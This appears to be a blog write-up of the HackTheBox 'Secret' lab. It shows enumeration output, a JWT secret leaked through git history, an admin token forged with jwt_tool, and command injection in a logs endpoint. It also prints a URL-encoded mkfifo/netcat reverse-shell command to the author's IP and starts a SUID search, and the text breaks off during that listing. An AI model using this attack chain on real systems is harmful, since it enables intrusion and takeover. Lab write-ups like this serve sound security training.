<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc&#43;UtqNVYIrxJx&#43;2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK&#43;oAgE7wbv&#43;&#43;el2WeD1DF8gw&#43;GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe&#43;TsG/8O/GFgNXU1WqFYGe4xl&#43;MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V&#43;NQ/7EJYJPMeugOtbputyZMH&#43;jALhzxBs07JLbw8Bh9JX&#43;ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN&#43;AsoE7k&#43;uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY&#43;DgpVElkr0vVa&#43;3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0&#43;oeMOlJN&#43;k= | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa&#43;8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0= | 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr&#43;32BQ9R/2lS/Mu33ExJwsci 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) 3000/tcp open http syn-ack Node.js (Express middleware) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf api [Status: 200, Size: 93, Words: 12, Lines: 1] assets [Status: 301, Size: 179, Words: 7, Lines: 11] download [Status: 301, Size: 183, Words: 7, Lines: 11] docs [Status: 200, Size: 0, Words: 1, Lines: 1] Just a web and ssh server&amp;hellip;so let&amp;rsquo;s visit the website and see what we can find" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/secret/secret/" />


    <title>
        
            Secret :: Zer0ne  â€” welcome friend
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Secret">
<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc&#43;UtqNVYIrxJx&#43;2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK&#43;oAgE7wbv&#43;&#43;el2WeD1DF8gw&#43;GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe&#43;TsG/8O/GFgNXU1WqFYGe4xl&#43;MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V&#43;NQ/7EJYJPMeugOtbputyZMH&#43;jALhzxBs07JLbw8Bh9JX&#43;ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN&#43;AsoE7k&#43;uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY&#43;DgpVElkr0vVa&#43;3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0&#43;oeMOlJN&#43;k= | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa&#43;8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0= | 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr&#43;32BQ9R/2lS/Mu33ExJwsci 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) 3000/tcp open http syn-ack Node.js (Express middleware) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf api [Status: 200, Size: 93, Words: 12, Lines: 1] assets [Status: 301, Size: 179, Words: 7, Lines: 11] download [Status: 301, Size: 183, Words: 7, Lines: 11] docs [Status: 200, Size: 0, Words: 1, Lines: 1] Just a web and ssh server&hellip;so let&rsquo;s visit the website and see what we can find"><meta itemprop="datePublished" content="2022-09-20T15:03:31+01:00" />
<meta itemprop="dateModified" content="2022-09-20T15:03:31+01:00" />
<meta itemprop="wordCount" content="1076"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>

<meta name="twitter:title" content="Secret"/>
<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc&#43;UtqNVYIrxJx&#43;2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK&#43;oAgE7wbv&#43;&#43;el2WeD1DF8gw&#43;GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe&#43;TsG/8O/GFgNXU1WqFYGe4xl&#43;MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V&#43;NQ/7EJYJPMeugOtbputyZMH&#43;jALhzxBs07JLbw8Bh9JX&#43;ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN&#43;AsoE7k&#43;uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY&#43;DgpVElkr0vVa&#43;3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0&#43;oeMOlJN&#43;k= | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa&#43;8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0= | 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr&#43;32BQ9R/2lS/Mu33ExJwsci 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) 3000/tcp open http syn-ack Node.js (Express middleware) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf api [Status: 200, Size: 93, Words: 12, Lines: 1] assets [Status: 301, Size: 179, Words: 7, Lines: 11] download [Status: 301, Size: 183, Words: 7, Lines: 11] docs [Status: 200, Size: 0, Words: 1, Lines: 1] Just a web and ssh server&hellip;so let&rsquo;s visit the website and see what we can find"/>



    <meta property="og:title" content="Secret" />
<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc&#43;UtqNVYIrxJx&#43;2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK&#43;oAgE7wbv&#43;&#43;el2WeD1DF8gw&#43;GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe&#43;TsG/8O/GFgNXU1WqFYGe4xl&#43;MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V&#43;NQ/7EJYJPMeugOtbputyZMH&#43;jALhzxBs07JLbw8Bh9JX&#43;ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN&#43;AsoE7k&#43;uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY&#43;DgpVElkr0vVa&#43;3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0&#43;oeMOlJN&#43;k= | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa&#43;8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0= | 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr&#43;32BQ9R/2lS/Mu33ExJwsci 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) 3000/tcp open http syn-ack Node.js (Express middleware) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf api [Status: 200, Size: 93, Words: 12, Lines: 1] assets [Status: 301, Size: 179, Words: 7, Lines: 11] download [Status: 301, Size: 183, Words: 7, Lines: 11] docs [Status: 200, Size: 0, Words: 1, Lines: 1] Just a web and ssh server&hellip;so let&rsquo;s visit the website and see what we can find" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/secret/secret/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-20T15:03:31+01:00" />
<meta property="article:modified_time" content="2022-09-20T15:03:31+01:00" /><meta property="og:site_name" content="Zer0ne" />




    <meta property="article:section" content="HackTheBox" />



    <meta property="article:published_time" content="2022-09-20 15:03:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">Zer0ne #</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/hackthebox/secret/secret/">Secret</a></h2>

            
            
            

            <div class="post-content">
                <h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<pre tabindex="0"><code>PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=
|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci

80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    syn-ack Node.js (Express middleware)
|_http-title: DUMB Docs
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h3 id="ffuf">ffuf</h3>
<pre tabindex="0"><code>api                     [Status: 200, Size: 93, Words: 12, Lines: 1]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11]
download                [Status: 301, Size: 183, Words: 7, Lines: 11]
docs                    [Status: 200, Size: 0, Words: 1, Lines: 1]
</code></pre><p>Just a web and ssh server&hellip;so let&rsquo;s visit the website and see what we can find</p>
<p>we can read docs about an api and download their source code..lol ok</p>
<p>There is a git repository in the source code folder&hellip;<code>gitTools</code> can extract everything</p>
<p><code>git show</code> on initial commit (use <code>git log</code> first to see all commits)</p>
<pre tabindex="0"><code>git show 55fe756a29268f9b4e786ae468952ca4a8df1bd8
commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv &lt;dasithsv@gmail.com&gt;
Date: Fri Sep 3 11:25:52 2021 +0530

first commit

diff --git a/.env b/.env
new file mode 100644
index 0000000..fb6f587
--- /dev/null
+++ b/.env
@@ -0,0 +1,2 @@
+DB_CONNECT = &#39;mongodb://127.0.0.1:27017/auth-web&#39;
+TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
diff --git a/.env.swp b/.env.swp
...
</code></pre><p>we can see a <code>secret token</code> here</p>
<p><code>auth.js</code> show a <code>'register'</code> endpoint of API</p>
<p><code>curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/register --data '{&quot;test&quot;: &quot;test&quot;}'</code></p>
<p>And the response was</p>
<pre tabindex="0"><code>- Connection #0 to host 10.10.11.120 left intact
  &#34;name&#34; is required
</code></pre><p>Analyzig the code we see it requires a name, email and password</p>
<pre tabindex="0"><code>    //create a user
    const user = new User({
        name: req.body.name,
        email: req.body.email,
        password:hashPaswrod
    });
</code></pre><p>so lets create one</p>
<p><code>curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/register --data '{&quot;name&quot;: &quot;nairolf&quot;,&quot;email&quot;:&quot;nairolf@mail.com&quot;,&quot;password&quot;:&quot;nairolf&quot;}'</code></p>
<p>wich works fine</p>
<pre tabindex="0"><code>Connection #0 to host 10.10.11.120 left intact
{&#34;user&#34;:&#34;nairolf&#34;}
</code></pre><p>lets login</p>
<p><code>curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/login --data '{&quot;email&quot;:&quot;nairolf@mail.com&quot;,&quot;password&quot;:&quot;nairolf&quot;}'</code></p>
<pre tabindex="0"><code>Connection #0 to host 10.10.11.120 left intact
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoibmFpcm9sZiIsImVtYWlsIjoibmFpcm9sZkBtYWlsLmNvbSIsImlhdCI6MTYzNjcyNTc0OX0.ey0C8-YyWb6Ke5ZjsjkxJlIMCsjzyAaU7ELI3GosBWA
</code></pre><p>we get a token&hellip;a jwt token, in the <code>verifytoken.js</code> it goes in the header to access <code>/priv</code> route (<code>priv.js</code>)</p>
<pre tabindex="0"><code>curl http://10.10.11.120/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoibmFpcm9sZiIsImVtYWlsIjoibmFpcm9sZkBtYWlsLmNvbSIsImlhdCI6MTYzNjcyNTc0OX0.ey0C8-YyWb6Ke5ZjsjkxJlIMCsjzyAaU7ELI3GosBWA&#39;
{&#34;role&#34;:{&#34;role&#34;:&#34;you are normal user&#34;,&#34;desc&#34;:&#34;nairolf&#34;}}
</code></pre><p>oh okay..normal user, that&rsquo;s offensive I demand to see the manager (*karen&rsquo;s noises)</p>
<p>In <code>private.js</code> you see how admin token is given</p>
<pre tabindex="0"><code>    if (name == &#39;theadmin&#39;){
        res.json({
            creds:{
                role:&#34;admin&#34;,
                username:&#34;theadmin&#34;,
                desc : &#34;welcome back admin,&#34;
            }
</code></pre><p>pretty simple&hellip;we just have to be <code>&quot;theadmin&quot;</code></p>
<p>we analyze the token with <code>jwt_tool</code></p>
<p><code>python jwt_tool.py ...the_long_token_goes_here...</code></p>
<pre tabindex="0"><code>=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = &#34;HS256&#34;
[+] typ = &#34;JWT&#34;

Token payload values:
[+] \_id = &#34;618e73d81433dd045a64902b&#34;
[+] name = &#34;nairolf&#34;
[+] email = &#34;nairolf@mail.com&#34;
[+] iat = 1636725749 ==&gt; TIMESTAMP = 2021-11-12 15:02:29 (UTC)

---

JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore

---
</code></pre><p>we can also forge ours from that</p>
<p><code>python jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoibmFpcm9sZiIsImVtYWlsIjoibmFpcm9sZkBtYWlsLmNvbSIsImlhdCI6MTYzNjcyNTc0OX0.ey0C8-YyWb6Ke5ZjsjkxJlIMCsjzyAaU7ELI3GosBWA</code></p>
<p>Basically we inject in our jwt-token, username &ldquo;theadmin&rdquo;, secret token as password, with signature hs256 that we identified in <code>jwt_tool</code></p>
<pre tabindex="0"><code>jwttool_2e65191b6ac8e06c39c25251292b9a05 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA
</code></pre><p>We use the crafted token to login</p>
<p><code>curl http://10.10.11.120/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA'</code></p>
<pre tabindex="0"><code>{&#34;creds&#34;:{&#34;role&#34;:&#34;admin&#34;,&#34;username&#34;:&#34;theadmin&#34;,&#34;desc&#34;:&#34;welcome back admin&#34;}}
</code></pre><p>Now we are admin&hellip;in <code>private.js</code> there was a <code>/logs</code> route only accessible when logged as admin</p>
<p>it takes a <code>file</code> parameter</p>
<p><code>curl http://10.10.11.120/api/logs?file=/etc/passwd -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA' {&quot;killed&quot;:false,&quot;code&quot;:128,&quot;signal&quot;:null,&quot;cmd&quot;:&quot;git log --oneline /etc/passwd&quot;}</code></p>
<p>From the error we understand it takes commands</p>
<p>we can enclose that to do our command injection after file=;</p>
<p><code>curl 'http://10.10.11.120/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA'</code></p>
<pre tabindex="0"><code>&#34;80bf34c fixed typos ðŸŽ‰\n0c75212 now we can view logs from server ðŸ˜ƒ\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n&#34;
</code></pre><p>so we can add a netcat shell there</p>
<p>And&hellip;we have to url-encode it (AS URL COMPONENT)</p>
<p><code>curl 'http://10.10.11.120/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.81%202311%20%3E%2Ftmp%2Ff' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA'</code></p>
<p>Then we are in</p>
<pre tabindex="0"><code>uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)

$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</code></pre><p>FLAG ONE</p>
<p><code>$ cat user.txt</code></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p><code>sudo -l</code> doesnt work&hellip;we need creds</p>
<p>Next move if finding SUID binaries</p>
<p><code>$ find / -type f -perm -u=s 2&gt;/dev/null</code></p>
<pre tabindex="0"><code>/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count
/snap/snapd/13640/usr/lib/snapd/snap-confine
/snap/snapd/13170/usr/lib/snapd/snap-confine
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/core18/1944/bin/mount
/snap/core18/1944/bin/ping
/snap/core18/1944/bin/su
/snap/core18/1944/bin/umount
/snap/core18/1944/usr/bin/chfn
/snap/core18/1944/usr/bin/chsh
/snap/core18/1944/usr/bin/gpasswd
/snap/core18/1944/usr/bin/newgrp
/snap/core18/1944/usr/bin/passwd
/snap/core18/1944/usr/bin/sudo
